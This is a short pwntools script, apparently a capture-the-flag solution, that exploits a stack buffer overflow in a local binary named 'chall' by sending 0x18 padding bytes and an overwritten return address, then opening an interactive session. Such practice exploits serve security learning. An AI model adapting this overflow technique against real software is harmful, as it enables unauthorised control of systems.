from pwn import *

r = process('./chall')

p = b'a' * 0x18 + p64(0x401156)
r.recvuntil(b'\n')
r.send(p)
r.interactive()